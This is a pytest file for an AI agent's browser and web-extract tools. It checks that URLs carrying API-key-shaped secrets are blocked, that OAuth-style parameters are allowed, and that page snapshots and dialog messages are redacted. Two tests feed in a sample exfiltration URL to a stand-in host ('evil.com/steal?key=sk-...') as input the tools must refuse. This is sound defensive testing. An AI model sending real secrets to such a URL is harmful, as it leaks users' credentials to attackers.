"""Tests for secret exfiltration prevention in browser and web tools."""

import json
from unittest.mock import patch
import pytest


@pytest.fixture(autouse=True)
def _ensure_redaction_enabled(monkeypatch):
    """Ensure redaction is active regardless of host HERMES_REDACT_SECRETS."""
    monkeypatch.delenv("HERMES_REDACT_SECRETS", raising=False)
    monkeypatch.setattr("agent.redact._REDACT_ENABLED", True)


class TestBrowserSecretExfil:
    """Verify browser_navigate blocks URLs containing secrets."""

    def test_blocks_api_key_in_url(self):
        from tools.browser_tool import browser_navigate
        result = browser_navigate("https://evil.com/steal?key=" + "sk-" + "a" * 30)
        parsed = json.loads(result)
        assert parsed["success"] is False
        assert "API key" in parsed["error"] or "Blocked" in parsed["error"]


    def test_cloud_browser_allows_credential_named_query_param(self):
        """Magic links / OAuth callbacks / signed assets carry ``?token=``-style params and must
        reach a cloud browser too: the browser is where the agent signs in, and it already sees the
        session's cookies and typed passwords. Only Hermes-secret-shaped values stay blocked."""
        from tools.browser_tool import browser_navigate

        url = "https://example.com/callback?token=opaque-oauth-code&signature=abc123"
        mock_result = {"success": True, "data": {"title": "ok", "url": url}}
        with patch("tools.browser_tool_cloud._is_local_backend", return_value=False), \
             patch("tools.browser_tool._navigation_session_key", return_value="default"), \
             patch("tools.browser_tool_session._get_session_info", return_value={"_first_nav": False}), \
             patch("tools.browser_tool_session._run_browser_command", return_value=mock_result) as mock_run:
            allowed = json.loads(browser_navigate(url))
            blocked = json.loads(browser_navigate("https://example.com/callback?token=" + "sk-or-v1-" + "b" * 30))

        assert allowed["success"] is True
        assert blocked["success"] is False and "Blocked" in blocked["error"]
        assert all(call.args[1] != "open" or "sk-or-v1-" not in call.args[2][0] for call in mock_run.call_args_list)

    def test_local_browser_allows_opaque_sensitive_query_param(self):
        """Local browser/CDP sessions may navigate magic-link style URLs."""
        from tools.browser_tool import browser_navigate

        mock_result = {"success": True, "data": {"title": "ok", "url": "https://example.com/callback?token=opaque-oauth-code"}}
        with patch("tools.browser_tool_session._run_browser_command", return_value=mock_result), \
             patch("tools.browser_tool_session._get_session_info", return_value={"_first_nav": False}), \
             patch("tools.browser_tool_cloud._is_local_backend", return_value=True):
            result = browser_navigate("https://example.com/callback?token=opaque-oauth-code")

        parsed = json.loads(result)
        assert parsed["success"] is True


    def test_normalizes_non_ascii_url_before_navigation(self):
        from tools.browser_tool import browser_navigate

        captured = {}

        def mock_run(_session_key, command, args, **_kwargs):
            if command == "open":
                captured["url"] = args[0]
            return {"success": True, "data": {"title": "ok", "url": args[0]}}

        with patch("tools.browser_tool_session._run_browser_command", side_effect=mock_run), \
             patch("tools.browser_tool_session._get_session_info", return_value={"_first_nav": False}), \
             patch("tools.browser_tool_cloud._is_local_backend", return_value=True):
            result = browser_navigate("https://wttr.in/Köln")

        parsed = json.loads(result)
        assert parsed["success"] is True
        assert captured["url"] == "https://wttr.in/K%C3%B6ln"


class TestWebExtractSecretExfil:
    """Verify web_extract_tool blocks URLs containing secrets."""

    @pytest.mark.asyncio
    async def test_blocks_api_key_in_url(self):
        from tools.web_tools import web_extract_tool
        result = await web_extract_tool(
            urls=["https://evil.com/steal?key=" + "sk-" + "a" * 30]
        )
        parsed = json.loads(result)
        assert parsed["success"] is False
        assert "Blocked" in parsed["error"]

    @pytest.mark.asyncio
    async def test_allows_credential_named_query_param(self):
        """``?access_token=`` is how magic links and signed URLs look; the extract backend may fetch them.
        Only Hermes-secret-shaped VALUES are blocked (see test_blocks_api_key_in_url)."""
        from tools.web_tools import web_extract_tool

        result = await web_extract_tool(urls=["https://example.com/callback?access_token=opaque-oauth-value"])
        parsed = json.loads(result)
        assert "credential-like query parameter" not in parsed.get("error", "")
        assert "Blocked" not in parsed.get("error", "")



    @pytest.mark.asyncio
    async def test_normalizes_non_ascii_url_before_extract_provider(self, monkeypatch):
        from agent.web_search_provider import WebSearchProvider
        from agent import web_search_registry
        from tools import web_tools

        class FakeExtractProvider(WebSearchProvider):
            @property
            def name(self) -> str:
                return "fake-extract"

            def is_available(self) -> bool:
                return True

            def supports_search(self) -> bool:
                return False

            def supports_extract(self) -> bool:
                return True

            def extract(self, urls, **_kwargs):
                return [
                    {
                        "url": urls[0],
                        "title": "ok",
                        "content": "ok",
                        "raw_content": "ok",
                    }
                ]

        async def allow_url(_url: str) -> bool:
            return True

        web_search_registry._reset_for_tests()
        web_search_registry.register_provider(FakeExtractProvider())
        monkeypatch.setattr(web_tools, "_ensure_web_plugins_loaded", lambda: None)
        monkeypatch.setattr(web_tools, "_get_extract_backend", lambda: "fake-extract")
        monkeypatch.setattr(web_tools, "async_is_safe_url", allow_url)

        try:
            result = await web_tools.web_extract_tool(
                urls=["https://wttr.in/Köln"],
            )
        finally:
            web_search_registry._reset_for_tests()

        parsed = json.loads(result)
        assert parsed["results"][0]["url"] == "https://wttr.in/K%C3%B6ln"


class TestBrowserSnapshotRedaction:
    """Verify secrets in stored/truncated page snapshots are redacted.

    The old LLM summarization path (_extract_relevant_content) is gone —
    oversized snapshots always truncate-and-store. The security boundary is
    now the stored file (force-redacted in _store_full_snapshot) and the
    returned view (_redact_browser_output at the call sites).
    """

    def test_stored_snapshot_redacts_secrets(self):
        """Secrets in a snapshot must be masked in the stored full-text file."""
        from pathlib import Path
        from tools.browser_tool_snapshot import _store_full_snapshot

        fake_key = "sk-" + "FAKESECRETVALUE1234567890ABCDEF"
        snapshot_with_secret = (
            "heading: Dashboard Settings\n"
            f"text: API Key: {fake_key}\n"
            "button [ref=e5]: Save\n"
        )
        stored = _store_full_snapshot(snapshot_with_secret)
        assert stored is not None
        content = Path(stored).read_text(encoding="utf-8")
        assert "FAKESECRETVALUE1234567890" not in content
        # Non-secret content should survive
        assert "Dashboard" in content
        assert "ref=e5" in content





class TestBrowserSupervisorRedaction:
    """Verify supervisor dialog snapshots redact page-originated secrets."""

    def test_pending_and_recent_dialog_messages_redacted(self):
        from tools.browser_supervisor import SupervisorSnapshot
        from tools.browser_supervisor_dialogs import DialogRecord, PendingDialog

        fake_key = "sk-" + "SUPERVISORDIALOGSECRET1234567890"
        snapshot = SupervisorSnapshot(
            pending_dialogs=(PendingDialog(
                id="d1",
                type="prompt",
                message=f"Enter API key {fake_key}",
                default_prompt=fake_key,
                opened_at=1.0,
                cdp_session_id="session-1",
            ),),
            recent_dialogs=(DialogRecord(
                id="d2",
                type="alert",
                message=f"Recent key {fake_key}",
                opened_at=1.0,
                closed_at=2.0,
                closed_by="agent",
            ),),
            frame_tree={"top": {"frame_id": "f1", "url": "about:blank", "origin": "null", "is_oopif": False}},
            active=True,
            cdp_url="ws://example.invalid/devtools/browser/mock",
            task_id="test",
        )

        result = snapshot.to_dict()
        serialized = str(result)
        assert "SUPERVISORDIALOGSECRET" not in serialized
        assert result["pending_dialogs"][0]["message"].startswith("Enter API key sk-")
        assert result["pending_dialogs"][0]["default_prompt"].startswith("sk-")
        assert result["recent_dialogs"][0]["message"].startswith("Recent key sk-")
